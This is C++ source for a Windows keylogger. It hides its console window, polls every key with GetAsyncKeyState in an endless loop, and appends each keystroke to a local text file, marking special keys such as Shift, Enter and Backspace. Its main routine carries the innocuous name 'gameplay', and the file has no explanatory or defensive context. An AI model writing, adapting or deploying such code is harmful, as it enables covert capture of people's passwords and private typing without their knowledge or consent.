#include<iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>

using namespace std;


void gameplay(){
    char superman;
    while(true){
        for(char superman=0;superman<=254;superman++)
        {
            if(GetAsyncKeyState(superman) & 0x1){

                ofstream myrecordings;
                myrecordings.open("myrecordings.txt",ios::app);
                switch (superman)
                {
                case VK_SHIFT:
                    myrecordings<<" [SHIFT] ";
                    break;
                case VK_BACK:
                    myrecordings<<" [BACKSPACE] ";
                    break;
                case VK_RETURN:
                    myrecordings<<" [ENTER] ";
                    break;
                case VK_CONTROL:
                    myrecordings<<" [CONTROL] ";
                    break;
                case VK_CAPITAL:
                    myrecordings<<" [CAPSLOCK] ";
                    break;
                case VK_TAB:
                    myrecordings<<" [TAB] ";
                    break;
                case VK_MENU:
                    myrecordings<<" [ALT] ";
                    break;
                case VK_LBUTTON:
                case VK_RBUTTON:
                    break;
                default:
                    myrecordings<<superman;
                    break;
                cout<<superman;
                }
            }
        }
    }
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     ShowWindow(GetConsoleWindow(),SW_HIDE);
       gameplay();
       return 0;
       
}
